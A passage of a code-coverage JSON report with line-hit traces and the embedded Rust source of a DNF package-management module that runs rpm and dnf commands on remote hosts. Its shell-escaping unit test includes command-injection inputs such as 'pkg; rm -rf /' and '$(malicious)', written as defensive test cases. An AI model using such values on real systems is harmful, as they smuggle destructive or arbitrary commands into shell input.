":0}},{"line":65,"address":[31271780,31271741],"length":1,"stats":{"Line":0}},{"line":66,"address":[31271835],"length":1,"stats":{"Line":0}},{"line":68,"address":[31271856],"length":1,"stats":{"Line":0}},{"line":71,"address":[31271771],"length":1,"stats":{"Line":0}},{"line":74,"address":[31271619],"length":1,"stats":{"Line":0}},{"line":78,"address":[31270479],"length":1,"stats":{"Line":1}},{"line":82,"address":[31269472],"length":1,"stats":{"Line":1}},{"line":84,"address":[31269526],"length":1,"stats":{"Line":1}},{"line":89,"address":[31269716],"length":1,"stats":{"Line":1}},{"line":91,"address":[26475696,26475705],"length":1,"stats":{"Line":1}},{"line":94,"address":[31269814],"length":1,"stats":{"Line":1}},{"line":99,"address":[31266416],"length":1,"stats":{"Line":0}},{"line":103,"address":[31265744],"length":1,"stats":{"Line":0}},{"line":107,"address":[31265776],"length":1,"stats":{"Line":0}},{"line":112,"address":[31266320],"length":1,"stats":{"Line":0}},{"line":117,"address":[31265792],"length":1,"stats":{"Line":0}},{"line":122,"address":[31265808],"length":1,"stats":{"Line":1}},{"line":124,"address":[31265852,31265945],"length":1,"stats":{"Line":2}},{"line":125,"address":[31266013],"length":1,"stats":{"Line":1}},{"line":126,"address":[31265985],"length":1,"stats":{"Line":1}},{"line":131,"address":[31265894,31266125],"length":1,"stats":{"Line":2}},{"line":132,"address":[31266196],"length":1,"stats":{"Line":1}},{"line":133,"address":[31266165],"length":1,"stats":{"Line":1}},{"line":137,"address":[31266103],"length":1,"stats":{"Line":0}},{"line":140,"address":[31267443,31269151,31266496],"length":1,"stats":{"Line":1}},{"line":146,"address":[31266552],"length":1,"stats":{"Line":1}},{"line":147,"address":[31266751],"length":1,"stats":{"Line":1}},{"line":150,"address":[31266801],"length":1,"stats":{"Line":1}},{"line":153,"address":[31266918,31266831],"length":1,"stats":{"Line":2}},{"line":155,"address":[31267088,31266978],"length":1,"stats":{"Line":2}},{"line":156,"address":[31267086,31267030],"length":1,"stats":{"Line":2}},{"line":157,"address":[31267159,31267079],"length":1,"stats":{"Line":0}},{"line":160,"address":[31267421,31267128,31267161,31267196],"length":1,"stats":{"Line":2}},{"line":161,"address":[31266994,31267454],"length":1,"stats":{"Line":2}},{"line":163,"address":[31267514],"length":1,"stats":{"Line":1}},{"line":164,"address":[31267564],"length":1,"stats":{"Line":1}},{"line":166,"address":[31268821],"length":1,"stats":{"Line":0}},{"line":167,"address":[31267609],"length":1,"stats":{"Line":0}},{"line":172,"address":[31267671,31267584],"length":1,"stats":{"Line":2}},{"line":173,"address":[31267710],"length":1,"stats":{"Line":1}},{"line":174,"address":[31267766],"length":1,"stats":{"Line":1}},{"line":175,"address":[31268100,31268184],"length":1,"stats":{"Line":2}},{"line":176,"address":[31268367],"length":1,"stats":{"Line":1}},{"line":180,"address":[31267784],"length":1,"stats":{"Line":1}},{"line":181,"address":[31267951],"length":1,"stats":{"Line":1}},{"line":186,"address":[31268988],"length":1,"stats":{"Line":0}},{"line":187,"address":[31267525],"length":1,"stats":{"Line":0}},{"line":192,"address":[31267355],"length":1,"stats":{"Line":1}},{"line":193,"address":[31268691,31268603,31268528],"length":1,"stats":{"Line":2}},{"line":195,"address":[31268724],"length":1,"stats":{"Line":1}},{"line":198,"address":[31266448],"length":1,"stats":{"Line":1}},{"line":200,"address":[31266475],"length":1,"stats":{"Line":1}},{"line":203,"address":[31266336],"length":1,"stats":{"Line":0}},{"line":209,"address":[31266362],"length":1,"stats":{"Line":0}}],"covered":53,"coverable":79},{"path":["/","home","artur","Repositories","rustible","src","modules","dnf.rs"],"content":"//! DNF module - Fedora/RHEL package management\n//!\n//! This module manages packages using the DNF package manager on Fedora,\n//! RHEL 8+, CentOS 8+, and other RPM-based distributions.\n\nuse super::{\n    Diff, Module, ModuleClassification, ModuleContext, ModuleError, ModuleOutput, ModuleParams,\n    ModuleResult, ParallelizationHint, ParamExt,\n};\nuse crate::connection::ExecuteOptions;\nuse std::collections::HashMap;\n\n/// Desired state for a package\n#[derive(Debug, Clone, PartialEq)]\npub enum DnfState {\n    /// Package should be installed\n    Present,\n    /// Package should be removed\n    Absent,\n    /// Package should be at the latest version\n    Latest,\n}\n\nimpl DnfState {\n    fn from_str(s: \u0026str) -\u003e ModuleResult\u003cSelf\u003e {\n        match s.to_lowercase().as_str() {\n            \"present\" | \"installed\" =\u003e Ok(DnfState::Present),\n            \"absent\" | \"removed\" =\u003e Ok(DnfState::Absent),\n            \"latest\" =\u003e Ok(DnfState::Latest),\n            _ =\u003e Err(ModuleError::InvalidParameter(format!(\n                \"Invalid state '{}'. Valid states: present, absent, latest\",\n                s\n            ))),\n        }\n    }\n}\n\n/// Module for DNF package management\npub struct DnfModule;\n\nimpl DnfModule {\n    /// Build execution options with become/sudo if needed\n    fn build_exec_options(context: \u0026ModuleContext) -\u003e ExecuteOptions {\n        let mut options = ExecuteOptions::new();\n\n        if context.r#become {\n            options.escalate = true;\n            options.escalate_user = context\n                .become_user\n                .clone()\n                .or_else(|| Some(\"root\".to_string()));\n            options.escalate_method = context.become_method.clone();\n        }\n\n        if let Some(ref work_dir) = context.work_dir {\n            options = options.with_cwd(work_dir);\n        }\n\n        options\n    }\n\n    /// Check if a package is installed via remote connection\n    async fn is_package_installed_remote(\n        conn: \u0026(dyn crate::connection::Connection + Send + Sync),\n        package: \u0026str,\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e ModuleResult\u003cbool\u003e {\n        let cmd = format!(\"rpm -q {}\", shell_escape(package));\n        match conn.execute(\u0026cmd, options).await {\n            Ok(result) =\u003e Ok(result.success),\n            Err(_) =\u003e Ok(false),\n        }\n    }\n\n    /// Get installed package version via remote connection\n    async fn get_package_version_remote(\n        conn: \u0026(dyn crate::connection::Connection + Send + Sync),\n        package: \u0026str,\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e ModuleResult\u003cOption\u003cString\u003e\u003e {\n        let cmd = format!(\n            \"rpm -q --qf '%{{VERSION}}-%{{RELEASE}}' {}\",\n            shell_escape(package)\n        );\n        match conn.execute(\u0026cmd, options).await {\n            Ok(result) if result.success =\u003e {\n                let version = result.stdout.trim().to_string();\n                if version.is_empty() {\n                    Ok(None)\n                } else {\n                    Ok(Some(version))\n                }\n            }\n            _ =\u003e Ok(None),\n        }\n    }\n\n    /// Run a DNF command via remote connection\n    async fn run_dnf_command_remote(\n        conn: \u0026(dyn crate::connection::Connection + Send + Sync),\n        args: \u0026[\u0026str],\n        packages: \u0026[String],\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e ModuleResult\u003c(bool, String, String)\u003e {\n        let mut cmd_parts: Vec\u003cString\u003e = vec![\"dnf\".to_string()];\n        cmd_parts.extend(args.iter().map(|s| s.to_string()));\n        cmd_parts.extend(packages.iter().map(|s| shell_escape(s)));\n\n        let cmd = cmd_parts.join(\" \");\n\n        let result = conn\n            .execute(\u0026cmd, options)\n            .await\n            .map_err(|e| ModuleError::ExecutionFailed(format!(\"Failed to execute dnf: {}\", e)))?;\n\n        Ok((result.success, result.stdout, result.stderr))\n    }\n\n    /// Update DNF cache via remote connection\n    async fn update_cache_remote(\n        conn: \u0026(dyn crate::connection::Connection + Send + Sync),\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e ModuleResult\u003c()\u003e {\n        let cmd = \"dnf makecache\";\n        let result = conn\n            .execute(cmd, options)\n            .await\n            .map_err(|e| ModuleError::ExecutionFailed(format!(\"Failed to update cache: {}\", e)))?;\n\n        if result.success {\n            Ok(())\n        } else {\n            Err(ModuleError::ExecutionFailed(format!(\n                \"Failed to update cache: {}\",\n                result.stderr\n            )))\n        }\n    }\n}\n\nimpl Module for DnfModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"dnf\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Manage packages with the DNF package manager\"\n    }\n\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        ModuleClassification::RemoteCommand\n    }\n\n    fn parallelization_hint(\u0026self) -\u003e ParallelizationHint {\n        // DNF uses locks - only one can run per host at a time\n        ParallelizationHint::HostExclusive\n    }\n\n    fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n        \u0026[\"name\"]\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Get packages - can be a single package or a list\n        let packages: Vec\u003cString\u003e = if let Some(names) = params.get_vec_string(\"name\")? {\n            names\n        } else {\n            vec![params.get_string_required(\"name\")?]\n        };\n\n        let state_str = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"present\".to_string());\n        let state = DnfState::from_str(\u0026state_str)?;\n        let update_cache = params.get_bool_or(\"update_cache\", false);\n\n        // Get connection from context\n        let conn = context.connection.as_ref().ok_or_else(|| {\n            ModuleError::ExecutionFailed(\n                \"No connection available in context. DNF module requires a remote connection.\"\n                    .to_string(),\n            )\n        })?;\n\n        // Build execution options with become/sudo\n        let exec_options = Self::build_exec_options(context);\n\n        // Use tokio runtime to execute async operations\n        let result = tokio::task::block_in_place(|| {\n            tokio::runtime::Handle::current().block_on(async {\n                // Update cache if requested\n                if update_cache \u0026\u0026 !context.check_mode {\n                    Self::update_cache_remote(conn.as_ref(), Some(exec_options.clone())).await?;\n                }\n\n                // Track what we'll do\n                let mut to_install: Vec\u003cString\u003e = Vec::new();\n                let mut to_remove: Vec\u003cString\u003e = Vec::new();\n                let mut already_ok: Vec\u003cString\u003e = Vec::new();\n\n                // Check current state of packages\n                for package in \u0026packages {\n                    let is_installed = Self::is_package_installed_remote(\n                        conn.as_ref(),\n                        package,\n                        Some(exec_options.clone()),\n                    )\n                    .await?;\n\n                    match state {\n                        DnfState::Present =\u003e {\n                            if is_installed {\n                                already_ok.push(package.clone());\n                            } else {\n                                to_install.push(package.clone());\n                            }\n                        }\n                        DnfState::Absent =\u003e {\n                            if is_installed {\n                                to_remove.push(package.clone());\n                            } else {\n                                already_ok.push(package.clone());\n                            }\n                        }\n                        DnfState::Latest =\u003e {\n                            // For 'latest', we always try to install/upgrade\n                            to_install.push(package.clone());\n                        }\n                    }\n                }\n\n                // Check mode - return what would happen\n                if context.check_mode {\n                    if to_install.is_empty() \u0026\u0026 to_remove.is_empty() {\n                        return Ok(ModuleOutput::ok(format!(\n                            \"All packages already in desired state: {}\",\n                            already_ok.join(\", \")\n                        )));\n                    }\n\n                    let mut msg = String::new();\n                    if !to_install.is_empty() {\n                        msg.push_str(\u0026format!(\"Would install: {}. \", to_install.join(\", \")));\n                    }\n                    if !to_remove.is_empty() {\n                        msg.push_str(\u0026format!(\"Would remove: {}. \", to_remove.join(\", \")));\n                    }\n\n                    return Ok(ModuleOutput::changed(msg.trim().to_string()));\n                }\n\n                // Perform the actual operations\n                let mut changed = false;\n                let mut results: HashMap\u003cString, String\u003e = HashMap::new();\n\n                if !to_install.is_empty() {\n                    let install_args = [\"install\", \"-y\"];\n                    let (success, stdout, stderr) = Self::run_dnf_command_remote(\n                        conn.as_ref(),\n                        \u0026install_args,\n                        \u0026to_install,\n                        Some(exec_options.clone()),\n                    )\n                    .await?;\n\n                    if !success {\n                        return Err(ModuleError::ExecutionFailed(format!(\n                            \"Failed to install packages: {}\",\n                            if stderr.is_empty() { stdout } else { stderr }\n                        )));\n                    }\n\n                    changed = true;\n                    for pkg in \u0026to_install {\n                        results.insert(pkg.clone(), \"installed\".to_string());\n                    }\n                }\n\n                if !to_remove.is_empty() {\n                    let remove_args = [\"remove\", \"-y\"];\n                    let (success, stdout, stderr) = Self::run_dnf_command_remote(\n                        conn.as_ref(),\n                        \u0026remove_args,\n                        \u0026to_remove,\n                        Some(exec_options.clone()),\n                    )\n                    .await?;\n\n                    if !success {\n                        return Err(ModuleError::ExecutionFailed(format!(\n                            \"Failed to remove packages: {}\",\n                            if stderr.is_empty() { stdout } else { stderr }\n                        )));\n                    }\n\n                    changed = true;\n                    for pkg in \u0026to_remove {\n                        results.insert(pkg.clone(), \"removed\".to_string());\n                    }\n                }\n\n                for pkg in \u0026already_ok {\n                    results.insert(pkg.clone(), \"ok\".to_string());\n                }\n\n                if changed {\n                    let mut msg = String::new();\n                    if !to_install.is_empty() {\n                        msg.push_str(\u0026format!(\"Installed: {}. \", to_install.join(\", \")));\n                    }\n                    if !to_remove.is_empty() {\n                        msg.push_str(\u0026format!(\"Removed: {}. \", to_remove.join(\", \")));\n                    }\n\n                    Ok(ModuleOutput::changed(msg.trim().to_string())\n                        .with_data(\"results\", serde_json::json!(results)))\n                } else {\n                    Ok(\n                        ModuleOutput::ok(\"All packages already in desired state\".to_string())\n                            .with_data(\"results\", serde_json::json!(results)),\n                    )\n                }\n            })\n        });\n\n        result\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let check_context = ModuleContext {\n            check_mode: true,\n            ..context.clone()\n        };\n        self.execute(params, \u0026check_context)\n    }\n\n    fn diff(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cOption\u003cDiff\u003e\u003e {\n        let packages: Vec\u003cString\u003e = if let Some(names) = params.get_vec_string(\"name\")? {\n            names\n        } else {\n            vec![params.get_string_required(\"name\")?]\n        };\n\n        let state_str = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"present\".to_string());\n        let state = DnfState::from_str(\u0026state_str)?;\n\n        // Get connection from context\n        let conn = match context.connection.as_ref() {\n            Some(c) =\u003e c,\n            None =\u003e {\n                // No connection available, return basic diff without checking remote state\n                let mut before_lines = Vec::new();\n                let mut after_lines = Vec::new();\n\n                for package in \u0026packages {\n                    match state {\n                        DnfState::Present | DnfState::Latest =\u003e {\n                            before_lines.push(format!(\"{}: (unknown)\", package));\n                            after_lines.push(format!(\"{}: (will be installed/updated)\", package));\n                        }\n                        DnfState::Absent =\u003e {\n                            before_lines.push(format!(\"{}: (unknown)\", package));\n                            after_lines.push(format!(\"{}: (will be removed)\", package));\n                        }\n                    }\n                }\n\n                return Ok(Some(Diff::new(\n                    before_lines.join(\"\\n\"),\n                    after_lines.join(\"\\n\"),\n                )));\n            }\n        };\n\n        let exec_options = Self::build_exec_options(context);\n\n        let result = tokio::task::block_in_place(|| {\n            tokio::runtime::Handle::current().block_on(async {\n                let mut before_lines = Vec::new();\n                let mut after_lines = Vec::new();\n\n                for package in \u0026packages {\n                    let is_installed = Self::is_package_installed_remote(\n                        conn.as_ref(),\n                        package,\n                        Some(exec_options.clone()),\n                    )\n                    .await?;\n\n                    let version = Self::get_package_version_remote(\n                        conn.as_ref(),\n                        package,\n                        Some(exec_options.clone()),\n                    )\n                    .await?\n                    .unwrap_or_default();\n\n                    match state {\n                        DnfState::Present | DnfState::Latest =\u003e {\n                            if is_installed {\n                                before_lines.push(format!(\"{}: {}\", package, version));\n                                after_lines.push(format!(\"{}: {}\", package, version));\n                            } else {\n                                before_lines.push(format!(\"{}: (not installed)\", package));\n                                after_lines.push(format!(\"{}: (will be installed)\", package));\n                            }\n                        }\n                        DnfState::Absent =\u003e {\n                            if is_installed {\n                                before_lines.push(format!(\"{}: {}\", package, version));\n                                after_lines.push(format!(\"{}: (will be removed)\", package));\n                            } else {\n                                before_lines.push(format!(\"{}: (not installed)\", package));\n                                after_lines.push(format!(\"{}: (not installed)\", package));\n                            }\n                        }\n                    }\n                }\n\n                Ok(Some(Diff::new(\n                    before_lines.join(\"\\n\"),\n                    after_lines.join(\"\\n\"),\n                )))\n            })\n        });\n\n        result\n    }\n}\n\n/// Escape a string for safe use in shell commands\nfn shell_escape(s: \u0026str) -\u003e String {\n    // Simple escape: wrap in single quotes and escape any single quotes\n    if s.chars()\n        .all(|c| c.is_alphanumeric() || c == '_' || c == '-' || c == '.' || c == '/')\n    {\n        s.to_string()\n    } else {\n        format!(\"'{}'\", s.replace('\\'', \"'\\\\''\"))\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_shell_escape() {\n        assert_eq!(shell_escape(\"simple\"), \"simple\");\n        assert_eq!(shell_escape(\"nginx\"), \"nginx\");\n        assert_eq!(shell_escape(\"with space\"), \"'with space'\");\n        assert_eq!(shell_escape(\"with'quote\"), \"'with'\\\\''quote'\");\n        assert_eq!(shell_escape(\"pkg; rm -rf /\"), \"'pkg; rm -rf /'\");\n        assert_eq!(shell_escape(\"$(malicious)\"), \"'$(malicious)'\");\n        assert_eq!(shell_escape(\"`cmd`\"), \"'`cmd`'\");\n    }\n\n    #[test]\n    fn test_dnf_state_from_str() {\n        assert_eq!(DnfState::from_str(\"present\").unwrap(), DnfState::Present);\n        assert_eq!(DnfState::from_str(\"installed\").unwrap(), DnfState::Present);\n        assert_eq!(DnfState::from_str(\"absent\").unwrap(), DnfState::Absent);\n        assert_eq!(DnfState::from_str(\"removed\").unwrap(), DnfState::Absent);\n        assert_eq!(DnfState::from_str(\"latest\").unwrap(), DnfState::Latest);\n        assert!(DnfState::from_str(\"invalid\").is_err());\n    }\n\n    #[test]\n    fn test_dnf_module_name() {\n        let module = DnfModule;\n        assert_eq!(module.name(), \"dnf\");\n    }\n\n    #[test]\n    fn test_dnf_module_classification() {\n        let module = DnfModule;\n        assert_eq!(module.classification(), ModuleClassification::RemoteCommand);\n    }\n\n    #[test]\n    fn test_dnf_module_parallelization_hint() {\n        let module = DnfModule;\n        assert_eq!(\n            module.parallelization_hint(),\n            ParallelizationHint::HostExclusive\n        );\n    }\n\n    #[test]\n    fn test_dnf_module_required_params() {\n        let module = DnfModule;\n        assert_eq!(module.required_params(), \u0026[\"name\"]);\n    }\n}\n","traces":[{"line":25,"address":[31289024,31289723,31289717],"length":1,"stats":{"Line":1}},{"line":26,"address":[31289153,31289051],"length":1,"stats":{"Line":2}},{"line":27,"address":[31289169],"length":1,"stats":{"Line":1}},{"line":28,"address":[31289282],"length":1,"stats":{"Line":1}},{"line":29,"address":[31289465,31289395],"length":1,"stats":{"Line":2}},{"line":30,"address":[31289487,31289433],"length":1,"stats":{"Line":2}},{"line":43,"address":[31289744,31290632,31290539],"length":1,"stats":{"Line":0}},{"line":44,"address":[31289774],"length":1,"stats":{"Line":0}},{"line":46,"address":[31290281,31289837],"length":1,"stats":{"Line":0}},{"line":47,"address":[31289897],"length":1,"stats":{"Line":0}},{"line":48,"address":[31289905,31289992,31290008,31290087],"length":1,"stats":{"Line":0}},{"line":50,"address":[31289909],"length":1,"stats":{"Line":0}},{"line":51,"address":[24908256,24908270],"length":1,"stats":{"Line":0}},{"line":52,"address":[31290160,31290121],"length":1,"stats":{"Line":0}},{"line":55,"address":[31290291,31290506,31289851],"length":1,"stats":{"Line":0}},{"line":56,"address":[31290459,31290299],"length":1,"stats":{"Line":0}},{"line":59,"address":[31290383],"length":1,"stats":{"Line":0}},{"line":63,"address":[31291024],"length":1,"stats":{"Line":0}},{"line":68,"address":[24915124,24915227],"length":1,"stats":{"Line":0}},{"line":69,"address":[25983021],"length":1,"stats":{"Line":0}},{"line":70,"address":[24916110],"length":1,"stats":{"Line":0}},{"line":71,"address":[24916079],"length":1,"stats":{"Line":0}},{"line":76,"address":[31290912],"length":1,"stats":{"Line":0}},{"line":81,"address":[24912844],"length":1,"stats":{"Line":0}},{"line":83,"address":[24912738],"length":1,"stats":{"Line":0}},{"line":85,"address":[24912775,24913046,24913353,24913718,24913129],"length":1,"stats":{"Line":0}},{"line":86,"address":[24913844],"length":1,"stats":{"Line":0}},{"line":87,"address":[24913950,24914025],"length":1,"stats":{"Line":0}},{"line":88,"address":[24914326,24914087,24914146],"length":1,"stats":{"Line":0}},{"line":89,"address":[24914328],"length":1,"stats":{"Line":0}},{"line":91,"address":[24914156],"length":1,"stats":{"Line":0}},{"line":94,"address":[24913755],"length":1,"stats":{"Line":0}},{"line":99,"address":[31290768],"length":1,"stats":{"Line":0}},{"line":105,"address":[24911152,24910266,24910152],"length":1,"stats":{"Line":0}},{"line":106,"address":[24912451,24910533,24910641,24912416],"length":1,"stats":{"Line":0}},{"line":107,"address":[24910713,24912096,24912131],"length":1,"stats":{"Line":0}},{"line":109,"address":[24910802],"length":1,"stats":{"Line":0}},{"line":111,"address":[24911547,24911043,24911354,24911106,24911471],"length":1,"stats":{"Line":0}},{"line":112,"address":[24910970,24910887,24911047],"length":1,"stats":{"Line":0}},{"line":113,"address":[24911071,24911128,24911191,24911418,24910197],"length":1,"stats":{"Line":0}},{"line":114,"address":[24911448,24911515,24912182,24912160],"length":1,"stats":{"Line":0}},{"line":116,"address":[24911652],"length":1,"stats":{"Line":0}},{"line":120,"address":[31290672],"length":1,"stats":{"Line":0}},{"line":124,"address":[24908371],"length":1,"stats":{"Line":0}},{"line":125,"address":[24909003,24908517,24908670,24909079,24908886,24909600],"length":1,"stats":{"Line":0}},{"line":126,"address":[24908521],"length":1,"stats":{"Line":0}},{"line":127,"address":[25963629],"length":1,"stats":{"Line":0}},{"line":128,"address":[24909616,24909047,24909638,24908980],"length":1,"stats":{"Line":0}},{"line":130,"address":[24909164,24909227],"length":1,"stats":{"Line":0}},{"line":131,"address":[24909209],"length":1,"stats":{"Line":0}},{"line":133,"address":[24909174,24909272],"length":1,"stats":{"Line":0}},{"line":142,"address":[31277568],"length":1,"stats":{"Line":1}},{"line":146,"address":[31274176],"length":1,"stats":{"Line":0}},{"line":150,"address":[31274208],"length":1,"stats":{"Line":1}},{"line":154,"address":[31274256],"length":1,"stats":{"Line":1}},{"line":159,"address":[31274224],"length":1,"stats":{"Line":1}},{"line":163,"address":[31278032,31279827,31279871],"length":1,"stats":{"Line":0}},{"line":169,"address":[31278091,31278419],"length":1,"stats":{"Line":0}},{"line":170,"address":[31278380],"length":1,"stats":{"Line":0}},{"line":172,"address":[31278431,31278511,31279884],"length":1,"stats":{"Line":0}},{"line":175,"address":[31278932,31279013,31279869],"length":1,"stats":{"Line":0}},{"line":177,"address":[31279070],"length":1,"stats":{"Line":0}},{"line":178,"address":[31279187,31279854,31279108],"length":1,"stats":{"Line":0}},{"line":179,"address":[31279342],"length":1,"stats":{"Line":0}},{"line":182,"address":[24896848],"length":1,"stats":{"Line":0}},{"line":183,"address":[24896895],"length":1,"stats":{"Line":0}},{"line":185,"address":[24896862],"length":1,"stats":{"Line":0}},{"line":190,"address":[31279579],"length":1,"stats":{"Line":0}},{"line":193,"address":[24896814,24896608],"length":1,"stats":{"Line":0}},{"line":194,"address":[24897400,24897268,24897069,24896629,24897204,24897289,24897664,24897247,24898398,24896992],"length":1,"stats":{"Line":0}},{"line":196,"address":[24898036,24897344,24897118],"length":1,"stats":{"Line":0}},{"line":197,"address":[24897365,24897482,24897698,24897234,24898339],"length":1,"stats":{"Line":0}},{"line":201,"address":[24897318],"length":1,"stats":{"Line":0}},{"line":202,"address":[24898049],"length":1,"stats":{"Line":0}},{"line":203,"address":[24898120],"length":1,"stats":{"Line":0}},{"line":206,"address":[24898288,24898310,24898188,24899298],"length":1,"stats":{"Line":0}},{"line":207,"address":[24901830,24901898,24898747,24901868,24898609,24898671],"length":1,"stats":{"Line":0}},{"line":208,"address":[24899360],"length":1,"stats":{"Line":0}},{"line":209,"address":[24901655],"length":1,"stats":{"Line":0}},{"line":210,"address":[24901725],"length":1,"stats":{"Line":0}},{"line":212,"address":[24897255,24898412,24901853,24901893,24898442,24898641,24898715],"length":1,"stats":{"Line":0}},{"line":214,"address":[24898809],"length":1,"stats":{"Line":0}},{"line":216,"address":[24898856],"length":1,"stats":{"Line":0}},{"line":217,"address":[24898991,24899072],"length":1,"stats":{"Line":0}},{"line":219,"address":[24899040,24898942],"length":1,"stats":{"Line":0}},{"line":223,"address":[24898869],"length":1,"stats":{"Line":0}},{"line":224,"address":[24899234,24899153],"length":1,"stats":{"Line":0}},{"line":226,"address":[24899104,24899202],"length":1,"stats":{"Line":0}},{"line":231,"address":[24898890,24899266],"length":1,"stats":{"Line":0}},{"line":237,"address":[24899398],"length":1,"stats":{"Line":0}},{"line":238,"address":[24899450,24900044,24900073],"length":1,"stats":{"Line":0}},{"line":239,"address":[24901371],"length":1,"stats":{"Line":0}},{"line":241,"address":[24900116,24901331],"length":1,"stats":{"Line":0}},{"line":245,"address":[24900058],"length":1,"stats":{"Line":0}},{"line":246,"address":[24900231,24900158],"length":1,"stats":{"Line":0}},{"line":247,"address":[24900245,24900325],"length":1,"stats":{"Line":0}},{"line":249,"address":[24900284,24900690],"length":1,"stats":{"Line":0}},{"line":250,"address":[24900704,24900785],"length":1,"stats":{"Line":0}},{"line":253,"address":[24901159,24900743],"length":1,"stats":{"Line":0}},{"line":257,"address":[24899419],"length":1,"stats":{"Line":0}},{"line":258,"address":[24899427],"length":1,"stats":{"Line":0}},{"line":260,"address":[24903431,24899560,24899483],"length":1,"stats":{"Line":0}},{"line":261,"address":[24899574],"length":1,"stats":{"Line":0}},{"line":262,"address":[24902172,24904194,24902248,24902078,24899917,24899979],"length":1,"stats":{"Line":0}},{"line":263,"address":[24899624],"length":1,"stats":{"Line":0}},{"line":264,"address":[24899724],"length":1,"stats":{"Line":0}},{"line":265,"address":[24899741],"length":1,"stats":{"Line":0}},{"line":266,"address":[24899812],"length":1,"stats":{"Line":0}},{"line":268,"address":[24900012,24899964,24897276,24902142,24901911,24902216],"length":1,"stats":{"Line":0}},{"line":270,"address":[24902438],"length":1,"stats":{"Line":0}},{"line":271,"address":[24902690],"length":1,"stats":{"Line":0}},{"line":273,"address":[24902562,24902450],"length":1,"stats":{"Line":0}},{"line":277,"address":[24902472],"length":1,"stats":{"Line":0}},{"line":278,"address":[24902480,24903229],"length":1,"stats":{"Line":0}},{"line":279,"address":[24903929,24903343,24904003],"length":1,"stats":{"Line":0}},{"line":283,"address":[24905704,24903443,24899659],"length":1,"stats":{"Line":0}},{"line":284,"address":[24903457],"length":1,"stats":{"Line":0}},{"line":285,"address":[24903809,24904468,24904544,24908081,24904374,24903871],"length":1,"stats":{"Line":0}},{"line":286,"address":[24903507],"length":1,"stats":{"Line":0}},{"line":287,"address":[24903616],"length":1,"stats":{"Line":0}},{"line":288,"address":[24903633],"length":1,"stats":{"Line":0}},{"line":289,"address":[24903704],"length":1,"stats":{"Line":0}},{"line":291,"address":[26108320],"length":1,"stats":{"Line":0}},{"line":293,"address":[24904734],"length":1,"stats":{"Line":0}},{"line":294,"address":[24904986],"length":1,"stats":{"Line":0}},{"line":296,"address":[24904858,24904746],"length":1,"stats":{"Line":0}},{"line":300,"address":[24904768],"length":1,"stats":{"Line":0}},{"line":301,"address":[24905502,24904776],"length":1,"stats":{"Line":0}},{"line":302,"address":[24907890,24905616,24907816],"length":1,"stats":{"Line":0}},{"line":306,"address":[24903542,24905725],"length":1,"stats":{"Line":0}},{"line":307,"address":[24905839,24907595,24907669],"length":1,"stats":{"Line":0}},{"line":310,"address":[24905873],"length":1,"stats":{"Line":0}},{"line":311,"address":[24905922],"length":1,"stats":{"Line":0}},{"line":312,"address":[24906301,24906234],"length":1,"stats":{"Line":0}},{"line":313,"address":[24906315,24906380],"length":1,"stats":{"Line":0}},{"line":315,"address":[24906730,24906348],"length":1,"stats":{"Line":0}},{"line":316,"address":[24906807,24906744],"length":1,"stats":{"Line":0}},{"line":319,"address":[24907215,24907394,24906777,24907481],"length":1,"stats":{"Line":0}},{"line":320,"address":[24907585,24907300,24907319,24907402,24907153],"length":1,"stats":{"Line":0}},{"line":322,"address":[24906156],"length":1,"stats":{"Line":0}},{"line":323,"address":[24906097,24905883,24905983],"length":1,"stats":{"Line":0}},{"line":324,"address":[24906025,24906216,24905932,24906006,24906105],"length":1,"stats":{"Line":0}},{"line":330,"address":[31279767],"length":1,"stats":{"Line":0}},{"line":333,"address":[31278006,31278000,31277600],"length":1,"stats":{"Line":0}},{"line":338,"address":[31277936],"length":1,"stats":{"Line":0}},{"line":341,"address":[31274272,31276526,31277480],"length":1,"stats":{"Line":0}},{"line":342,"address":[31274706,31274337],"length":1,"stats":{"Line":0}},{"line":343,"address":[31274658],"length":1,"stats":{"Line":0}},{"line":345,"address":[31277493,31274798,31274718],"length":1,"stats":{"Line":0}},{"line":348,"address":[31275228,31275312,31277478],"length":1,"stats":{"Line":0}},{"line":350,"address":[24891728,24891740],"length":1,"stats":{"Line":0}},{"line":351,"address":[31275407,31275486,31277457],"length":1,"stats":{"Line":0}},{"line":354,"address":[31275644],"length":1,"stats":{"Line":0}},{"line":355,"address":[31275712],"length":1,"stats":{"Line":0}},{"line":358,"address":[31275751],"length":1,"stats":{"Line":0}},{"line":359,"address":[31275770],"length":1,"stats":{"Line":0}},{"line":361,"address":[31275833,31275913],"length":1,"stats":{"Line":0}},{"line":362,"address":[31276013],"length":1,"stats":{"Line":0}},{"line":364,"address":[31276901,31276542],"length":1,"stats":{"Line":0}},{"line":365,"address":[31277036],"length":1,"stats":{"Line":0}},{"line":368,"address":[31276580],"length":1,"stats":{"Line":0}},{"line":369,"address":[31276742],"length":1,"stats":{"Line":0}},{"line":374,"address":[31276305,31276250],"length":1,"stats":{"Line":0}},{"line":375,"address":[31276059],"length":1,"stats":{"Line":0}},{"line":376,"address":[31276218,31276138],"length":1,"stats":{"Line":0}},{"line":381,"address":[31275741],"length":1,"stats":{"Line":0}},{"line":383,"address":[31277208],"length":1,"stats":{"Line":0}},{"line":384,"address":[24895588,24891984,24891797,24892100,24892031,24892143,24892428,24892172],"length":1,"stats":{"Line":0}},{"line":385,"address":[24892077],"length":1,"stats":{"Line":0}},{"line":386,"address":[24892219],"length":1,"stats":{"Line":0}},{"line":388,"address":[24894712,24892287,24892402,24892386],"length":1,"stats":{"Line":0}},{"line":389,"address":[24895911,24896107,24896166,24896242,24896548,24895873],"length":1,"stats":{"Line":0}},{"line"